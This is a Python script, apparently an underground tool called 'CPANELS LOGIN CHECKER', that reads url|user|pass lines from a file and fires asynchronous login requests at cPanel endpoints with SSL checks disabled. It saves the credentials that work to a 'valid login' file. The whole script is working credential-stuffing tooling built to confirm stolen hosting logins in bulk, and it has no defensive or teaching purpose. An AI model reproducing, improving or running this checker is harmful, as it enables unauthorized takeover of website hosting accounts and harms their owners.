# -*- coding: utf-8 -*-
# Coded by SUSUDOSU
# Please don't change any code

import os
import socket
import sys
import asyncio
from colorama import Fore, Style, init
from platform import system
#color 
green = Fore.GREEN
red = Fore.RED
ra = Style.RESET_ALL

try :
    import aiohttp
except ImportError :
    print("Please install aiohttp [!]\n\t pip install aiohttp")

async def login_cpanel(url : str, username :str, pwd :str, success_file :str  , failed_file :str) -> None:
    '''
    :param url: cPanel url
    :param username: cPanel Username
    :param pwd: cPanel Password
    :param success_file: for valid login
    :param failed_file: for valid login
    :return:  check login using username and password
    '''
    try:
        async with aiohttp.ClientSession() as session:
            login_url = f"{url}/login/?login_only=1"
            login_data = {'user': username, 'pass': pwd}

            async with session.post(login_url, data=login_data, allow_redirects=True, ssl=False,timeout=10) as response:
                data = await response.text()

                if "security_token" in data:
                    print(f"{green}[+]{ra}cPanel Login: {url} {green}User{ra}:{username} {green}Pass{ra}:{pwd} ===> {green}Login successful!{ra}")

                    with open(success_file, 'a') as success_output:
                        success_output.write(f"{url}|{username}|{pwd}\n")
                else:
                    print(f"{red}[!]{ra}cPanel Login: {url} {red}User{ra}:{username} {red}Pass{ra}: {pwd} ===>{red}Login failed{ra}")

                    with open(failed_file, 'a') as failure_output:
                        failure_output.write(f"{url}|{username}|{pwd}\n")
                if response.history:
                    await login_cpanel(response.url, username, pwd, success_file, failed_file)

    except Exception as e:
        print(f"Error during login: {e}")
        with open(failed_file, 'a') as failure_output:
            failure_output.write(f"{url}|{username}|{pwd}\n")

async def process_file(file_path: str,success_file: str, failed_file: str) -> None :
    '''

    :param file_path: User input cPanel list
    :param success_file: for valid login
    :param failed_file: for invalid login
    :return: read the file_path file then split it and send  login_cpanel function to check login 
    '''
    try:
        with open(file_path, 'r',encoding='utf-8') as file:
            lines = file.readlines()

        tasks = []
        for line in lines:
            parts = line.strip().split('|')
            if len(parts) == 3:
                cpanel_url, cpanel_username, cpanel_password = parts
                task = login_cpanel(cpanel_url, cpanel_username, cpanel_password, success_file, failed_file)
                tasks.append(task)
            else:
                print(f"Invalid format in line: {line}")

        await asyncio.gather(*tasks)

    except Exception as e:
        print(f"Error processing file: {e}")


def clear():
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')

def banners():
    # Display the ASCII art banner
    print("                                                                                         ")
    print(Fore.RED + "_______ _______ _______ _____  _______ _______ _______ _______ _______  ")
    print(Fore.RED + "|     __|   |   |    |  |     \|   _   |    |  |    ___|     __|    ___|")
    print(Fore.WHITE + "|__     |   |   |       |  --  |       |       |    ___|__     |    ___|")
    print(Fore.WHITE + "|_______|_______|__|____|_____/|___|___|__|____|_______|_______|_______|")
    print(Fore.RED + f"════════════╦══════════════════════════════════════════════╦════════════")
    # Display additional information about the host/device
    host_name = socket.gethostname()
    ip_address = socket.gethostbyname(host_name)
    print(Fore.RED + f"╔═══════════╩══════════════════════════════════════════════╩═══════════╗")
    print(Fore.LIGHTGREEN_EX + f"                         [ CPANELS LOGIN CHECKER ]            ")
    print(Fore.RED + f"╚══════════════════════════════════════════════════════════════════════╝")
    print(Fore.RED + f"[ ! ]{Fore.RESET} Author: {Fore.LIGHTRED_EX}SUSUDOSU {Fore.LIGHTGREEN_EX}EST - 2023")
    print(f"{Fore.GREEN}[ {Fore.RED}! {Fore.GREEN}]{Fore.RESET} Device: {host_name}")
    print(f"{Fore.GREEN}[ {Fore.RED}! {Fore.GREEN}]{Fore.RESET} Host  : {ip_address}")
    print(Fore.RED + f"════════════════════════════════════════════════╝")
    print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX} ! {Fore.LIGHTWHITE_EX}] File Format : {Fore.LIGHTGREEN_EX}https://site:2083|user|pass")

async def main() -> None:
    clear()
    banners()
    file_path = input(f"{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTGREEN_EX}+ {Fore.LIGHTWHITE_EX}] Enter the file name: ")
    success_file = "sxr-valid-login.txt"
    failed_file = "sxr-invalid-login.txt"

    await process_file(file_path, success_file, failed_file)

if __name__ == "__main__":
    asyncio.run(main())
